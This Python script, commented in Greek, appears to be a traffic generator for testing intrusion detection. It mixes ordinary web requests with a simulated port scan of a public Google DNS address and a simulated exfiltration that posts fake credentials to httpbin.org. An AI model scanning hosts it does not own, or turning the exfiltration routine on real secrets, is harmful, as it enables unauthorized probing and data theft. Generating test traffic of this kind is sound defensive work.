import time
import requests
import socket
import random
import json

# Στόχοι για τα τεστ (Safe targets)
TARGET_URL = "http://httpbin.org"

def normal_web_activity():
    """Προσομοίωση απλού χρήστη που σερφάρει"""
    endpoints = ["/get", "/html", "/robots.txt"]
    endpoint = random.choice(endpoints)
    url = f"{TARGET_URL}{endpoint}"
    
    print(f"🌍 [NORMAL] Visiting: {url}")
    try:
        requests.get(url, timeout=5)
    except:
        pass

def simulate_port_scan():
    """Προσομοίωση ύποπτου σκαναρίσματος πορτών"""
    target_ip = "8.8.8.8" # Google DNS (Safe to ping/connect)
    ports = [21, 22, 23, 80, 443, 8080, 3306]
    
    print(f"🕵️  [SUSPICIOUS] Scanning ports on {target_ip}...")
    
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        result = sock.connect_ex((target_ip, port))
        sock.close()
    
    print("   -> Scan finished.")

def simulate_data_exfiltration():
    """Προσομοίωση κλοπής δεδομένων (POST Request)"""
    url = f"{TARGET_URL}/post"
    fake_data = {
        "user": "admin",
        "password": "super_secret_password_123",
        "confidential": "Project_X_Blueprints",
        "flag": "CATCH_ME_IF_YOU_CAN" 
    }
    
    print(f"⚠️  [ATTACK] Exfiltrating sensitive data to {url}...")
    try:
        requests.post(url, json=fake_data, timeout=5)
    except:
        pass

if __name__ == "__main__":
    print("--- Traffic Generator Started ---")
    print("Press Ctrl+C to stop.\n")
    
    try:
        while True:
            # Διαλέγουμε τυχαία μια ενέργεια
            action = random.choice(['web', 'web', 'web', 'scan', 'exfil'])
            
            if action == 'web':
                normal_web_activity()
            elif action == 'scan':
                simulate_port_scan()
            elif action == 'exfil':
                simulate_data_exfiltration()
                
            # Περιμένουμε λίγο για να μην μπουκώσουμε το δίκτυο
            sleep_time = random.uniform(1, 3)
            time.sleep(sleep_time)
            print("-" * 30)
            
    except KeyboardInterrupt:
        print("\n🛑 Generator stopped.")
